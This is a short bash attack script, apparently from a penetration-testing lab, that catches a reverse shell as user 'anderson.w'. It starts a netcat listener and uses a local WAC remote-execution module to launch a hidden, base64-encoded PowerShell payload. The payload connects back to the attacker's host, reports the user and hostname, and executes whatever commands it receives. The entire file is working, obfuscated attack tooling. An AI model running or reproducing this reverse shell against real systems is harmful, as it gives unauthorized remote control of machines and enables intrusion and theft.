#!/usr/bin/env bash
# Catch reverse shell as anderson.w via WAC
set -euo pipefail
LHOST="${LHOST:-$(ip -4 -o addr show tun0 2>/dev/null | awk '{print $4}' | cut -d/ -f1)}"
PORT="${PORT:-4444}"
DIR="$(cd "$(dirname "$0")" && pwd)"
cd "$DIR"

if [[ -z "${LHOST}" ]]; then
  echo "[-] brak tun0 / LHOST"; exit 1
fi

echo "[*] LHOST=${LHOST} PORT=${PORT}"
fuser -k "${PORT}/tcp" 2>/dev/null || true
sleep 0.3

# trigger after listener is up
(
  sleep 1.5
  python3 - "$LHOST" "$PORT" <<'PY'
import sys, base64
sys.path.insert(0, ".")
from wac_ps import WAC
LHOST, PORT = sys.argv[1], int(sys.argv[2])
ps = f'''
$client = New-Object System.Net.Sockets.TCPClient("{LHOST}",{PORT});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
$w = New-Object IO.StreamWriter($stream); $w.AutoFlush=$true
$w.WriteLine("=== ANDERSON REV " + (whoami) + " @ " + (hostname) + " ===")
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
  $data = (New-Object Text.ASCIIEncoding).GetString($bytes,0,$i)
  try {{ $sendback = (iex $data 2>&1 | Out-String) }} catch {{ $sendback = $_ | Out-String }}
  $sendback2 = $sendback + "PS " + (pwd).Path + "> "
  $sb = ([text.encoding]::ASCII).GetBytes($sendback2)
  $stream.Write($sb,0,$sb.Length); $stream.Flush()
}}
$client.Close()
'''
enc = base64.b64encode(ps.encode("utf-16-le")).decode()
script = f'''
$exe = "$env:SystemRoot\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
Start-Process -FilePath $exe -ArgumentList "-NoP","-NonI","-w","Hidden","-EncodedCommand","{enc}" -WindowStyle Hidden
"rev_ok $(whoami)"
'''
print(WAC().run(script), flush=True)
PY
) &

echo "[*] starting nc — shell should drop in ~2s"
if command -v rlwrap >/dev/null 2>&1; then
  exec rlwrap -cAr nc -lvnp "$PORT"
else
  exec nc -lvnp "$PORT"
fi
